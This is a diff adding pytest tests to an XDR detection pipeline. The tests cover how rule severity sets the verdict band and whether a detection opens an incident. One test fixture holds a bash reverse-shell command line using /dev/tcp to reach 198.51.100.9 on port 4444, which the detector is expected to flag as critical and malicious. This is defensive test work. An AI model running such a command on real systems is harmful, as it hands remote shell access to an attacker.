@@ -291,3 +291,132 @@ async def test_a_detection_fault_never_destroys_the_evidence_record():
         await db["v2_shadow_observations"].delete_many({"tenant_id": tenant})
         await db["xdr_canonical_evidence"].delete_many({"tenant_id": tenant})
         client.close()
+
+
+# ── verdict threshold semantics · P0-F.1 ──────────────────────────
+#
+# The gate was NOT loosened. The defect was that severity never reached
+# the gate for a source that supplies no vendor severity of its own.
+
+def test_rule_severity_supplies_the_band_only_when_the_source_has_none():
+    from detection_content.xdr_iue import understand
+    canonical = {"event_id": "cev_1", "provenance": {"trace_id": "t"},
+                 "process": {"name": "bash"}}
+    detection = {"matched": True, "rule_id": "EDR-LNX-004",
+                 "detections": [{"rule_id": "EDR-LNX-004",
+                                 "severity": "critical"},
+                                {"rule_id": "EDR-LNX-002",
+                                 "severity": "medium"}]}
+    iue = understand(canonical, detection)
+    # The most severe rule that fired — a critical behaviour is not
+    # diluted by benign-looking company.
+    assert iue["severity_hint"] == "CRITICAL"
+    assert iue["severity_source"] == "detection.rule_severity"
+
+    # A source that DOES declare a band keeps it: existing CEF/LEEF and
+    # snort semantics are untouched.
+    banded = understand({**canonical,
+                         "security": {"severity_band": "LOW"}}, detection)
+    assert banded["severity_hint"] == "LOW"
+    assert banded["severity_source"] == "source.security.severity_band"
+    numeric = understand({**canonical, "security": {"severity": 1}},
+                         detection)
+    assert numeric["severity_hint"] == "HIGH"
+    assert numeric["severity_source"] == "source.security.severity"
+
+
+def test_no_detection_means_no_severity_and_no_verdict_inflation():
+    from detection_content.xdr_iue import understand
+    from detection_content.xdr_veee import compute_verdict
+    canonical = {"event_id": "cev_2", "provenance": {"trace_id": "t"},
+                 "process": {"name": "ls"}}
+    for detection in (None, {"matched": False, "detections": []}):
+        iue = understand(canonical, detection)
+        assert iue["severity_hint"] == "INFORMATIONAL"
+        assert iue["severity_source"] == "none_declared"
+        v = compute_verdict(canonical, detection, iue, {})
+        assert v["label"] == "INCONCLUSIVE"
+        assert v["score"] == 0
+
+
+def test_the_verdict_bands_and_gate_were_not_moved():
+    from detection_content import xdr_veee as veee
+    assert veee._WEIGHT_DETECTION_MATCH == 45
+    assert veee._LABEL_BANDS == [(80, "MALICIOUS"), (55, "SUSPICIOUS"),
+                                 (25, "LIKELY_BENIGN"), (0, "INCONCLUSIVE")]
+    assert veee._WEIGHT_SEVERITY["CRITICAL"] == 35
+
+
+def test_severity_drives_the_verdict_deterministically():
+    from detection_content.xdr_iue import understand
+    from detection_content.xdr_veee import compute_verdict
+    canonical = {"event_id": "cev_3", "provenance": {"trace_id": "t"},
+                 "process": {"name": "bash"}}
+    expected = {"critical": ("MALICIOUS", 80), "high": ("SUSPICIOUS", 70),
+                "medium": ("SUSPICIOUS", 60), "low": ("LIKELY_BENIGN", 50)}
+    for sev, (label, score) in expected.items():
+        det = {"matched": True, "rule_id": "R",
+               "detections": [{"rule_id": "R", "severity": sev}]}
+        v = compute_verdict(canonical, det, understand(canonical, det), {})
+        assert (v["label"], v["score"]) == (label, score), sev
+
+
+@pytest.mark.asyncio
+async def test_a_critical_endpoint_detection_reaches_a_real_incident():
+    from motor.motor_asyncio import AsyncIOMotorClient
+    from detection_content.xdr_pipeline import process_event_through_pipeline
+    client = AsyncIOMotorClient(os.environ["MONGO_URL"])
+    db = client[os.environ["DB_NAME"]]
+    tenant = f"p0f1-{uuid.uuid4().hex[:8]}"
+    ev = {"activity": "PROCESS", "operation": "PROCESS_OBSERVED",
+          "observed_at": "2026-06-06T13:00:00+00:00", "pid": 21, "ppid": 1,
+          "image": "bash", "image_path": "/usr/bin/bash",
+          "command_line": "/bin/bash -c exec 3<>/dev/tcp/198.51.100.9/4444",
+          "user": "root", "collection_method": "PROC_POLL",
+          "parent_lookup_state": "OBSERVED", "parent_image": "sshd"}
+    try:
+        out = await process_event_through_pipeline(
+            db, ev, trace_id=f"raw_{uuid.uuid4().hex[:20]}",
+            integration_id="nivxforge-linux-sensor",
+            collector_id="ep_crit", tenant_id=tenant)
+        assert "EDR-LNX-004" in [d["rule_id"]
+                                 for d in out["detection"]["detections"]]
+        assert out["iue"]["severity_hint"] == "CRITICAL"
+        assert out["verdict"]["label"] == "MALICIOUS"
+        assert out["verdict"]["score"] == 80
+        assert out["incident"]["created"] is True
+        inc_id = out["incident"]["incident_id"]
+        case = await db["workspace_cases"].find_one({"id": inc_id})
+        assert case is not None, "the incident must exist in the store"
+        assert case["tenant_id"] == tenant
+        assert case["doc_type"] == "xdr_incident"
+    finally:
+        await db["xdr_canonical_evidence"].delete_many({"tenant_id": tenant})
+        await db["workspace_cases"].delete_many({"tenant_id": tenant})
+        client.close()
+
+
+@pytest.mark.asyncio
+async def test_a_benign_endpoint_event_never_becomes_an_incident():
+    from motor.motor_asyncio import AsyncIOMotorClient
+    from detection_content.xdr_pipeline import process_event_through_pipeline
+    client = AsyncIOMotorClient(os.environ["MONGO_URL"])
+    db = client[os.environ["DB_NAME"]]
+    tenant = f"p0f1-{uuid.uuid4().hex[:8]}"
+    ev = {"activity": "PROCESS", "operation": "PROCESS_OBSERVED",
+          "observed_at": "2026-06-06T13:05:00+00:00", "pid": 22, "ppid": 1,
+          "image": "ls", "image_path": "/bin/ls", "command_line": "ls -la",
+          "user": "root", "collection_method": "PROC_POLL",
+          "parent_lookup_state": "OBSERVED", "parent_image": "bash"}
+    try:
+        out = await process_event_through_pipeline(
+            db, ev, trace_id=f"raw_{uuid.uuid4().hex[:20]}",
+            integration_id="nivxforge-linux-sensor",
+            collector_id="ep_benign", tenant_id=tenant)
+        assert out["detection"]["matched"] is False
+        assert out["incident"]["created"] is False
+        assert await db["workspace_cases"].count_documents(
+            {"tenant_id": tenant}) == 0
+    finally:
+        await db["xdr_canonical_evidence"].delete_many({"tenant_id": tenant})
+        client.close()
